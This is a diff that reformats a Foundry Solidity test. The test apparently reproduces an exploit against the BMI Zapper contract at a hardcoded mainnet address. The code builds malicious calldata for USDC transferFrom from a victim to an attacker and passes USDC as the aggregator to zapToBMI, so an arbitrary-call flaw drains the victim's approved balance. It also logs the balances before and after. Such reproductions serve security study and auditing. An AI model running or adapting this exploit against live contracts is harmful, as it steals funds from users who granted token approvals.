@@ -15,6 +15,7 @@ import "./../interface.sol";
 */
 
 interface IBMIZapper {
+
     function zapToBMI(
         address _from,
         uint256 _amount,
@@ -27,9 +28,11 @@ interface IBMIZapper {
         bytes calldata _aggregatorData,
         bool refundDust
     ) external returns (uint256);
+
 }
 
 contract ExploitTest is Test {
+
     IBMIZapper bmiZapper = IBMIZapper(0x4622aFF8E521A444C9301dA0efD05f6b482221b8);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 BUSD = IERC20(0x4Fabb145d64652a948d72533023f6E7A623C7C53);
@@ -45,11 +48,7 @@ contract ExploitTest is Test {
     }
 
     function testExploit() external {
-        emit log_named_decimal_uint(
-            "Victim's USDC balance before exploit",
-            USDC.balanceOf(victim),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Victim's USDC balance before exploit", USDC.balanceOf(victim), USDC.decimals());
 
         uint256 victimBalance = USDC.balanceOf(victim);
 
@@ -59,38 +58,27 @@ contract ExploitTest is Test {
 
         // Craft malicious data to call a transferFrom function in the USDC token contract
 
-        bytes memory maliciousCallData = abi.encodeWithSignature(
-            "transferFrom(address,address,uint256)",
-            victim,
-            attacker,
-            victimBalance
-        );
+        bytes memory maliciousCallData =
+            abi.encodeWithSignature("transferFrom(address,address,uint256)", victim, attacker, victimBalance);
 
         // Call zapToBMI with malicious aggregator data
 
         bmiZapper.zapToBMI(
             address(BUSD), // BUSD
             0, // _amount
-            address(0), // _fromUnderlying 
-            0, // _fromUnderlyingAmount 
+            address(0), // _fromUnderlying
+            0, // _fromUnderlyingAmount
             0, // _minBMIRecv
             bmiConstituents,
             bmiConstituentsWeightings,
             address(USDC), // _aggregator
             maliciousCallData, // _aggregatorData
-            true 
+            true
         );
 
-        emit log_named_decimal_uint(
-            "Victim's USDC balance after exploit",
-            USDC.balanceOf(victim),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Victim's USDC balance after exploit", USDC.balanceOf(victim), USDC.decimals());
 
-        emit log_named_decimal_uint(
-            "Attacker's USDC balance after exploit",
-            USDC.balanceOf(attacker),
-            USDC.decimals()
-        );
+        emit log_named_decimal_uint("Attacker's USDC balance after exploit", USDC.balanceOf(attacker), USDC.decimals());
     }
+
 }
